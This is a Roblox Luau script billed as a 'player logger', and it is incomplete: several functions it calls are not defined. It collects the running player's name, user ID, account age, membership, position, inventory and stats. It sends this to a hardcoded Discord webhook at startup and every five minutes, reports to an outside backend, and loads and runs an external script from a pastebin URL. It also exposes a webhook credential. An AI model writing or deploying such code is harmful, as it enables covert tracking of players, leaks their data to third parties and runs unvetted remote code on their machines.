local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- CONFIGURATION
local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
local INSTANCE_URL = BACKEND_BASE_URL .. "/instance"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"

local REPORT_INTERVAL = 300 -- 5 minutes
local DEBUG_MODE = true

-- System variables
local player = Players.LocalPlayer
local currentInstanceId = game.JobId
local isRunning = true

-- ====================== [ENHANCED UTILITY FUNCTIONS] ======================

local function log(message)
    if DEBUG_MODE then
        print("[Logger] " .. message)
    end
end

local function collectDetailedData()
    local character = player.Character or player.CharacterAdded:Wait()
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    
    -- Inventory scanning
    local inventory = {}
    if player:FindFirstChild("Backpack") then
        for _, item in ipairs(player.Backpack:GetChildren()) do
            table.insert(inventory, {
                name = item.Name,
                class = item.ClassName
            })
        end
    end
    
    -- Leaderstats scanning
    local stats = {}
    if player:FindFirstChild("leaderstats") then
        for _, stat in ipairs(player.leaderstats:GetChildren()) do
            stats[stat.Name] = stat.Value
        end
    end
    
    return {
        player = {
            username = player.Name,
            displayName = player.DisplayName,
            userId = player.UserId,
            accountAge = player.AccountAge,
            membership = player.MembershipType.Name
        },
        character = {
            health = humanoid and humanoid.Health or 0,
            maxHealth = humanoid and humanoid.MaxHealth or 0,
            position = character:GetPivot().Position
        },
        instance = {
            jobId = game.JobId,
            placeId = game.PlaceId,
            gameId = game.GameId,
            playerCount = #Players:GetPlayers(),
            maxPlayers = Players.MaxPlayers,
            serverTime = os.time()
        },
        inventory = inventory,
        stats = stats
    }
end

local function createRichEmbed(data, messageType)
    local embed = {
        title = "üìä "..messageType.." | "..data.player.username,
        color = 0x3498db,
        fields = {},
        timestamp = DateTime.fromUnixTimestamp(data.instance.serverTime):ToIsoDate(),
        footer = {
            text = "Instance ID: "..data.instance.jobId
        }
    }

    -- Player Info
    table.insert(embed.fields, {
        name = "üë§ Player Info",
        value = string.format(
            "Display: %s\nUID: %d\nAccount Age: %d days\nMembership: %s",
            data.player.displayName,
            data.player.userId,
            data.player.accountAge,
            data.player.membership
        ),
        inline = true
    })

    -- Instance Info
    table.insert(embed.fields, {
        name = "üåê Instance",
        value = string.format(
            "Place ID: %d\nGame ID: %d\nPlayers: %d/%d",
            data.instance.placeId,
            data.instance.gameId,
            data.instance.playerCount,
            data.instance.maxPlayers
        ),
        inline = true
    })

    -- Character Info
    table.insert(embed.fields, {
        name = "‚öî Character",
        value = string.format(
            "HP: %.1f/%.1f\nPosition: %s",
            data.character.health,
            data.character.maxHealth,
            tostring(data.character.position)
        ),
        inline = false
    })

    -- Inventory
    if #data.inventory > 0 then
        local inventoryStr = table.concat(
            table.create(#data.inventory, function(i)
                return string.format("%s (%s)", data.inventory[i].name, data.inventory[i].class)
            end),
            "\n"
        )
        table.insert(embed.fields, {
            name = "üéí Inventory ("..#data.inventory..")",
            value = inventoryStr,
            inline = true
        })
    end

    -- Stats
    if next(data.stats) ~= nil then
        local statsStr = ""
        for name, value in pairs(data.stats) do
            statsStr ..= string.format("%s: %s\n", name, tostring(value))
        end
        table.insert(embed.fields, {
            name = "üìà Stats",
            value = statsStr,
            inline = true
        })
    end

    return {embeds = {embed}}
end

local function sendEnhancedWebhook(messageType, customMessage)
    local collectedData = collectDetailedData()
    local payload = createRichEmbed(collectedData, messageType)
    
    if customMessage then
        payload.content = "**"..messageType.."**\n"..customMessage
    end

    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if not success then
        log("‚ùå Enhanced webhook failed: "..tostring(response))
        -- Fallback to simple webhook
        sendToWebhook(messageType..": "..(customMessage or "No additional info"))
    end
end

-- ====================== [MODIFIED MAIN FUNCTIONS] ======================

local function initialize()
    log("Initializing player logger for " .. player.Name)
    sendEnhancedWebhook("LOGGER_STARTED", "Player: "..player.Name)
    
    -- Initial registration
    if registerPlayer() then
        log("Successfully registered player")
    else
        log("Failed to register player")
    end
    
    -- Start periodic reporting
    spawn(function()
        while isRunning do
            updateInstanceStatus("active")
            sendEnhancedWebhook("PERIODIC_REPORT", "Automatic status update")
            task.wait(REPORT_INTERVAL)
        end
    end)
    
    -- Track script execution
    updateInstanceStatus("script_started")
    sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
    
    local scriptSuccess = executeExternalScript()
    
    if scriptSuccess then
        updateInstanceStatus("script_completed")
        sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
    else
        updateInstanceStatus("script_failed", {error = "External script execution failed"})
        sendEnhancedWebhook("SCRIPT_FAILED", "Execution failed")
    end
end

local function shutdown()
    isRunning = false
    updateInstanceStatus("stopped")
    sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
end

-- [REST OF THE ORIGINAL FUNCTIONS REMAIN UNCHANGED]
-- (registerPlayer, updateInstanceStatus, executeExternalScript, etc.)
